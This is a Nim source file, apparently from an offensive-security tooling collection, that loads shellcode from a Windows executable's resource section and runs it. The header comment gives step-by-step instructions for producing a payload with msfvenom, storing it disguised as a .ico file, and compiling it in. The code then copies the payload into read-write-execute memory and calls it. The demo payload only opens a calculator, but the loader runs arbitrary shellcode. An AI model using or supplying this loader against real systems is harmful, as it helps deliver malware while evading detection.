#[
    Author: pruno, Twitter: @pruno9
    License: BSD 3-Clause
]#

#[ How to use
    1 - Create a shellcode using whatever you want, for example : msfvenom -p windows/x64/exec CMD="cmd.exe /c calc.exe" -f raw > tests/rsrc/calc.ico
    2 - Create a resource .rc file and put this in it (one line) : 3 RCDATA  "calc.ico"
        - the 3 here is arbitrary, you can you put whatever you want
        - RCDATA is taken from here : https://docs.microsoft.com/en-us/windows/win32/menurc/resource-types, its type is RT_RCDATA is the linked table
        - "calc.io" is the shellcode file created before
    3 - Compile the resource file (needs mingw64) : /usr/bin/x86_64-w64-mingw32-windres resource.rc -o resource.o
    4 - Compile this nim file : nim c -d:mingw rsrc_section_shellcode.nim
    5 - Enjoy
]#

import winim, winim/lean
import system

when defined(gcc) and defined(windows):
    {.link: "resource.o"} # the name of compiled resource object file as stated above

proc main() = 
    var resourceId = 3 # It is the first value inside the .rc file created before
    var resourceType = 10 # RCDATA is 10 (see link above about resource types)
    
    # Find the resource in the .rsrc section using the information defined above
    var myResource: HRSRC = FindResource(cast[HMODULE](NULL), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
    
    # Get the size of the resource
    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](NULL), myResource)

    # Load the resource to copy in the allocated memory space
    var myResourceData: HGLOBAL = LoadResource(cast[HMODULE](NULL), myResource)
    
    # Allocate some memory
    let rPtr = VirtualAlloc(
        NULL,
        cast[SIZE_T](myResourceSize),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # Copy the data of the resource into the allocated memory space
    copyMem(rPtr, cast[LPVOID](myResourceData), myResourceSize)

    # Current process execution
    let a = cast[proc(){.nimcall.}](rPtr)
    a()

when isMainModule:
    main()